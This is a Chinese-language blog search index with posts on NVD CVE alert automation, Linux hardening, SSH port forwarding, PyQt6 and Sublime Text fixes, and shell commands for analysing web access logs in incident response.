<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>实现每日推送CVE漏洞</title>
    <url>/2020/CVE%E4%BF%A1%E6%81%AF.html</url>
    <content><![CDATA[<p><font color=green>随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息</font><span id="more"></span></p>
<h2 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h2><h3 id="1、获取CVE数据："><a href="#1、获取CVE数据：" class="headerlink" title="1、获取CVE数据："></a>1、获取CVE数据：</h3><p>可以爬取CVE官方网站每日公布的漏洞信息，但是当日漏洞没有漏洞定级和CVSS评分；而CVSS的评分需要NVD(美国国家漏洞数据库)，所以我这里直接选择使用NVD提供的api获取漏洞信息</p>
<p><img src="/../images/upload/cve_01.png"></p>
<h3 id="2、漏洞信息过滤："><a href="#2、漏洞信息过滤：" class="headerlink" title="2、漏洞信息过滤："></a>2、漏洞信息过滤：</h3><p>获取的漏洞信息可能多可能少，而我们只需要获得想要的信息便可，比如只想获取2020-07-08号的高危漏洞情况</p>
<p><img src="/../images/upload/cve_02.png"></p>
<h3 id="3、消息推送："><a href="#3、消息推送：" class="headerlink" title="3、消息推送："></a>3、消息推送：</h3><p>通过企业微信的api进行消息的推送<br><img src="/../images/upload/cve_03.png"></p>
<h3 id="4、定时推送："><a href="#4、定时推送：" class="headerlink" title="4、定时推送："></a>4、定时推送：</h3><p>放在服务器上建立定时任务，比如每天上班前8:50推送消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">50 08 * * * /usr/bin/python3 cve.py</span><br></pre></td></tr></table></figure>

<h3 id="5、效果展示："><a href="#5、效果展示：" class="headerlink" title="5、效果展示："></a>5、效果展示：</h3><p><img src="/../images/upload/cve_04.jpg"></p>
<p><img src="/../images/upload/cve_05.jpg"></p>
<h3 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h3><p>有些事情做起来没什么难度，但你的想法、思考很重要…获取源码方式，请公众号内回复’CVE’即可</p>
<hr>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9udmQubmlzdC5nb3YvR2VuZXJhbC9OZXdzL05ldy1OVkQtQ1ZFLUNQRS1BUEktYW5kLVNPQVAtUmV0aXJlbWVudA==">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93b3JrLndlaXhpbi5xcS5jb20vYXBpL2RvYw==">https://work.weixin.qq.com/api/doc<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo部署到Github文件夹大小写问题</title>
    <url>/2022/Hexo%E9%83%A8%E7%BD%B2%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>​    今天写完博客上传<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWI=">github<i class="fa fa-external-link-alt"></i></span>时，发现Linux标签404了，上Github仓库一看发现<strong>categories</strong>文件夹下的Linux是小写的，访问&#x2F;categories&#x2F;linux&#x2F;，无法正常显示</p>
<p>![image-20220110130828002](&#x2F;Users&#x2F;tbo&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220110130828002.png)</p>
<p><strong>原因</strong><br>查询资料发现，git是默认不区分大小写的，有时候传到Github上是不会将小写改为大写的。</p>
<p><strong>解决方法</strong></p>
<p>进入.git文件夹，将config文件的 <code>ignorecase=true</code> 改为 <code>ignorecase=false</code>。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux主机安全配置规范</title>
    <url>/2021/Linux%E5%9F%BA%E7%BA%BF.html</url>
    <content><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure>

<p><strong>2 配置口令生存周期</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure>

<p><strong>3 配置密码复杂度策略</strong></p>
<p>  CentOS系统：修改&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件, 在ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<span id="more"></span><br>例如：password requisite pam_cracklib.so ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p>
<p><strong>4 限定用户su到root</strong></p>
<p>  编辑su文件(vi &#x2F;etc&#x2F;pam.d&#x2F;su)，在开头添加下面两行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group=wheel</span><br></pre></td></tr></table></figure>

<p>这表明只有wheel组的成员可以使用su命令成为root用户。</p>
<h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在文件/etc/profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure>

<p><strong>2 设置命令行界面超时退出</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/profile,增加 export TMOUT=300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure>

<p><strong>3 禁止root用户远程ssh登录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改/etc/ssh/sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure>

<p><strong>4 启用syslog日志审计</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/rsyslog.conf, 配置: authpriv.* /var/log/secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure>



<h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/vsftpd.conf(或/etc/vsftpd/vsftpd.conf)文件，设置：anonymous_enable=NO</span><br></pre></td></tr></table></figure>

<p><strong>2 禁止root登录VSFTP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/ftpusers(或/etc/vsftpd/ftpusers)文件，添加root</span><br></pre></td></tr></table></figure>

<p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p>
<h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找，find / -maxdepth 3 -name .netrc 2&gt;/dev/null，重命名或者删除</span><br></pre></td></tr></table></figure>

<p><strong>2 删除hosts.equiv文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name hosts.equiv 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><strong>3 删除.rhosts 文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name .rhosts 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><strong>4 关闭不必要的服务和端口</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure>
<p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p>
<p>删除或重命名”&#x2F;etc”目录下的 issue.net 和 issue 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/issue /etc/issue.bak</span><br><span class="line">mv /etc/issue.net /etc/issue.net.bak</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS下PyQt6图标icon无法显示</title>
    <url>/2021/PyQt6%E5%9B%BE%E6%A0%87.html</url>
    <content><![CDATA[<p>刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码<span id="more"></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QFile</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QIcon, QPixmap</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyIcon</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.setupGUI()  <span class="comment">#创建窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setupGUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setWindowTitle(<span class="string">&#x27;Icon&#x27;</span>)</span><br><span class="line">        self.resize(<span class="number">400</span>, <span class="number">200</span>)  <span class="comment">#设置窗口大小</span></span><br><span class="line">        <span class="comment"># self.setWindowIcon(QIcon(&#x27;./alarm.svg&#x27;)))</span></span><br><span class="line">        </span><br><span class="line">        button = QPushButton(QIcon(<span class="string">&#x27;./alarm.svg&#x27;</span>), <span class="string">&#x27;Click me&#x27;</span>, self)</span><br><span class="line">        button.setToolTip(<span class="string">&quot;This is Click&quot;</span>)</span><br><span class="line">        button.setGeometry(<span class="number">150</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>)  <span class="comment">#设置按钮坐标和大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    path = <span class="string">&#x27;./alarm.svg&#x27;</span></span><br><span class="line">    app.setWindowIcon(QIcon(QPixmap(path)))  <span class="comment"># MAC下程序图标是显示在程序坞中，切记!</span></span><br><span class="line"></span><br><span class="line">    form = MyIcon()</span><br><span class="line">    form.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())  <span class="comment">#退出主循环</span></span><br></pre></td></tr></table></figure>

<p>setWindowIcon是QApplication的方法，而不是QWidget的，所以使用app.setWindowIcon设置是对的<br>注意：<font color=red>在macOS下，图标是显示在程序坞中！！！</font>&gt;</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH端口转发</title>
    <url>/2018/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html</url>
    <content><![CDATA[<h2 id="一、-简述"><a href="#一、-简述" class="headerlink" title="一、 简述"></a><a href="#%E4%B8%80%E3%80%81-%E7%AE%80%E8%BF%B0" title="一、 简述"></a>一、 简述</h2><p>SSH在维基百科的定义：Secure hell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。<span id="more"></span><br>More info: <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvU2VjdXJlX1NoZWxs">SSH<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="端口转发简述："><a href="#端口转发简述：" class="headerlink" title="端口转发简述："></a><a href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%AE%80%E8%BF%B0%EF%BC%9A" title="端口转发简述："></a>端口转发简述：</h3><p>但大多数人不知道的是SSH还能提供端口转发，并提供相应的加密及解密服务这也被称为“隧道”(tunneling)，而该功能在可以在有防火墙限制时，转发其它TCP流量来通过SSH端口传输，也就实现了“翻墙”。<br>1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。<br>2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。<br><img src="/images/upload/2018-08-251.jpg"><br>如上图所示，TCP端口A和B并不直接通信，而是转发到SSH client及SSH server来进行通信，从而实现了数据加密<br>同时可以绕过防火墙的限制。</p>
<hr>
<h2 id="二、-本地转发与远程转发"><a href="#二、-本地转发与远程转发" class="headerlink" title="二、 本地转发与远程转发"></a><a href="#%E4%BA%8C%E3%80%81-%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E4%B8%8E%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91" title="二、 本地转发与远程转发"></a>二、 本地转发与远程转发</h2><h3 id="本地转发示例："><a href="#本地转发示例：" class="headerlink" title="本地转发示例："></a><a href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E7%A4%BA%E4%BE%8B%EF%BC%9A" title="本地转发示例："></a>本地转发示例：</h3><p>现在假设Server上某个端口的服务不能被远程连接，但它的SSH端口却可以连接，那此时我们就可以通过SSH隧道建立本地转发来连接Server上的端口。<br>本地转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">ssh -L &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh  hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Client上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -L 1234:localhost:389 Server</span>
</pre></td></tr></table></figure>

<p>这里的localhost指的是Server。在选择本地监听端口时通常为10334-65535之间且未使用的端口号，因为低于1024的端口号需要管理员权限。<br>然后我们的数据流将会是这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">Client-&gt;Client:1234-&gt;Client ssh-&gt;Server:22-&gt;Server:389</span>
</pre></td></tr></table></figure>

<p>最后Serve上的3389端口应用返回的数据逆向的传输回去完成整个通信。</p>
<h3 id="远程转发示例："><a href="#远程转发示例：" class="headerlink" title="远程转发示例："></a><a href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91%E7%A4%BA%E4%BE%8B%EF%BC%9A" title="远程转发示例："></a>远程转发示例：</h3><p>现在由于网络或防火墙的原因我们不能用SSH直接从Client连接到Server，但是反向连接却是被允许的，那我们就可以使用远程转发了。<br>远程转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">ssh -R &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Server上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -R 1234:localhost:389 Client</span>
</pre></td></tr></table></figure>

<p>而此次的应用数据流和上面的本地转发依然是一样的，那为什么又要叫远程转发呢？往下看…</p>
<h3 id="本地转发与远程转发的区别与分析："><a href="#本地转发与远程转发的区别与分析：" class="headerlink" title="本地转发与远程转发的区别与分析："></a><a href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E4%B8%8E%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%88%86%E6%9E%90%EF%BC%9A" title="本地转发与远程转发的区别与分析："></a>本地转发与远程转发的区别与分析：</h3><p>本地转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Client ssh ————&gt; Server ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>远程转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Server ssh ————&gt; Client ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>从上面就可以看出区分本地转发还是远程转发就是看ssh的连接反向是否和应用的连接方向一致。</p>
<h4 id="如果别的主机想使用我们的本地转发应该怎么办呢？"><a href="#如果别的主机想使用我们的本地转发应该怎么办呢？" class="headerlink" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a><a href="#%E5%A6%82%E6%9E%9C%E5%88%AB%E7%9A%84%E4%B8%BB%E6%9C%BA%E6%83%B3%E4%BD%BF%E7%94%A8%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E5%BA%94%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2%EF%BC%9F" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a>如果别的主机想使用我们的本地转发应该怎么办呢？</h4><p>现在我们假设有A、B、C、D四台主机，A上面的应用想通过B建立的本地转发连接D的服务。<br>只需在B上面执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -g -L 1234:&lt;D&gt;:389 &lt;C&gt;</span>
</pre></td></tr></table></figure>

<p>然后在A上配置连接B的1234端口即可，这里的-g就是为了A能够使用B的本地端口转发。在上面的额连接中A&lt;——&gt;B和C&lt;——&gt;D之间的连接并不是安全的，它们之间并没有经过SSH加解密。</p>
<h2 id="其它类型的转发："><a href="#其它类型的转发：" class="headerlink" title="其它类型的转发："></a><a href="#%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AC%E5%8F%91%EF%BC%9A" title="其它类型的转发："></a>其它类型的转发：</h2><h3 id="动态转发："><a href="#动态转发：" class="headerlink" title="动态转发："></a><a href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%EF%BC%9A" title="动态转发："></a>动态转发：</h3><p>上面所讲到的动态转发，远程转发在应用的服务端都有固定端口号，那如果我们不知道这个端口号怎么办？比如Web浏览…<br>动态转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -D &lt;<span class="built_in">local</span> port&gt; &lt;ssh Server&gt;</span>
</pre></td></tr></table></figure>

<p>例如在你本地执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ssh -D 1080 root@ip</span>
</pre></td></tr></table></figure>

<p>这样就创建了一个socks代理服务，如果你有一台国外的vps，这就可以实现翻墙了而且不用担心GFW检测而封了ip。</p>
<h3 id="X协议转发："><a href="#X协议转发：" class="headerlink" title="X协议转发："></a><a href="#X%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91%EF%BC%9A" title="X协议转发："></a>X协议转发：</h3><p>X窗口和VNC相似都可以给Linux提供桌面窗口服务，现在我们要把Xclient端的X窗口显示在Xserver端。<br>先需要Xclient(也就是远程Linux主机)上指定Xserver的位置，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DISPLAY=&lt;X Server IP&gt;:&lt;display <span class="comment">#&gt;.&lt;virtual #&gt;</span></span>
</pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">export DISPLAY=youDesktop:1.0</span>
</pre></td></tr></table></figure>

<p>建立连接，则从本地主机(Xserver端)发起一个ssh连接即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -X &lt;ssh server&gt;</span>
</pre></td></tr></table></figure>

<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><a href="#Summary" title="Summary"></a>Summary</h2><p>总的来说，对于一些已知端口的应用如Telnet&#x2F;Smtp等，我们可以使用本地转发或远程转发。而动态转发则实现了socks代理从而起到加密数据传输和突破防火墙的功能。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Network proxy</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3无法安装包解决</title>
    <url>/2018/Sublime-Text3%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E5%8C%85%E8%A7%A3%E5%86%B3.html</url>
    <content><![CDATA[<p>最近学习GO语言用package control安装插件时，一直报错如下图：<br><img src="/images/upload/2019-02-282.png" alt="报错图片1"><br><img src="/images/upload/2019-02-281.png" alt="报错图片2"><br>看样子是channel_v3.json这个文件不能访问，然后将解决办法汇总如下。<span id="more"></span></p>
<h2 id="1-利用github"><a href="#1-利用github" class="headerlink" title="1.利用github"></a><a href="#1-%E5%88%A9%E7%94%A8github" title="1.利用github"></a>1.利用github</h2><p>通过官方下载最新的channel_v3文件，上传到自己的Github，然后修改Package Control的channels。<br>官方:<span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdlY29udHJvbC5pby9jaGFubmVsX3YzLmpzb24=">channel_v3.json<i class="fa fa-external-link-alt"></i></span><br>有该问题且嫌麻烦的伙伴可以使用我的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json</span>
</pre></td></tr></table></figure>

<p>使用方法：<br><img src="/images/upload/2019-02-283.png" alt="use1"><br><img src="/images/upload/2019-02-284.png" alt="use2"><br>在配置文件下添加下面的语句即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
</pre></td><td class="code"><pre><span class="line"><span class="string">"channels"</span>:</span>
<span class="line">    [</span>
<span class="line">        <span class="string">"https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json"</span></span>
<span class="line">    ],</span>
</pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Programming</tag>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>web入侵日志分析命令</title>
    <url>/2021/access%E6%97%A5%E5%BF%97.html</url>
    <content><![CDATA[<blockquote>
<p>在应急响应或者入侵排查中常常会涉及服务器日志分析，在web日志中可以获取很多关键信息，如访问量最多的IP、访问次数最多的页面等等，于是收集，整理一些服务器日志分析命令</p>
</blockquote>
<p><strong>1、查看有多少个IP访问：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br></pre></td></tr></table></figure>

<p><strong>2、查看某一个页面被访问的次数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ grep &quot;/index.php&quot; log_file | wc -l</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><strong>3、查看每一个IP访问了多少个页面：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file &gt; log.txt</span><br><span class="line">$ sort -n -t &#x27; &#x27; -k 2 log.txt 配合sort进一步排序</span><br></pre></td></tr></table></figure>

<p><strong>4、将每个IP访问的页面数进行从小到大排序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br></pre></td></tr></table></figure>

<p><strong>5、查看某一个IP访问了哪些页面：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>6、去掉搜索引擎统计的页面：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br></pre></td></tr></table></figure>

<p><strong>7、查看2020年4月17日02时这一个小时内有多少IP访问:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 17/Jan/2020:02 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure>

<p><strong>8、查看访问前十个ip地址</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ awk &#x27;&#123;print $1&#125;&#x27; |sort|uniq -c|sort -nr |head -10 access_log</span><br></pre></td></tr></table></figure>

<p><strong>uniq -c 相当于分组统计并把统计数放在最前面</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log|awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr|head -10</span><br><span class="line">$ cat access.log|awk &#x27;&#123;counts[$(11)]+=1&#125;; END &#123;for(url in counts) print counts[url], url&#125;</span><br></pre></td></tr></table></figure>

<p><strong>9、访问次数最多的10个文件或页面</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat log_file|awk &#x27;&#123;print $11&#125;&#x27;|sort|uniq -c|sort -nr | head -10</span><br><span class="line">$ cat log_file|awk &#x27;&#123;print $11&#125;&#x27;|sort|uniq -c|sort -nr|head -20</span><br><span class="line">$ awk &#x27;&#123;print $1&#125;&#x27; log_file |sort -n -r |uniq -c | sort -n -r | head -20 </span><br></pre></td></tr></table></figure>

<p>访问量最大的前20个ip</p>
<p><strong>10、通过子域名访问次数，依据referer来计算，稍有不准</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log | awk &#x27;&#123;print $11&#125;&#x27; | sed -e &#x27; s/http:////&#x27; -e &#x27; s//.*//&#x27; | sort | uniq -c | sort -rn | head -20</span><br></pre></td></tr></table></figure>

<p><strong>11、列出传输大小最大的几个文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($7~/.php/)&#123;print $10 &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#x27;|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p><strong>12、列出输出大于200000byte(约200kb)的页面以及对应页面发生次数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($10 &gt; 200000 &amp;&amp; $7~/.php/)&#123;print $7&#125;&#x27;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p><strong>13、如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($7~/.php/)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#x27;|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p><strong>14、列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($NF &gt; 60 &amp;&amp; $7~/.php/)&#123;print $7&#125;&#x27;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure>

<p><strong>15、列出传输时间超过 30 秒的文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |awk &#x27;($NF &gt; 30)&#123;print $7&#125;&#x27;|sort -n|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure>

<p><strong>16、列出当前服务器每一进程运行的数量，倒序排列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ps -ef | awk -F &#x27; &#x27; &#x27;&#123;print $8 &quot; &quot; $9&#125;&#x27; |sort | uniq -c |sort -nr |head -20</span><br></pre></td></tr></table></figure>

<p><strong>17、查看apache当前并发访问数</strong></p>
<p>对比httpd.conf中MaxClients的数字差距多少</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ netstat -an | grep ESTABLISHED | wc -l</span><br></pre></td></tr></table></figure>

<p><strong>18、可以使用如下参数查看数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ps -ef|grep httpd|wc -l</span><br><span class="line">1388</span><br></pre></td></tr></table></figure>

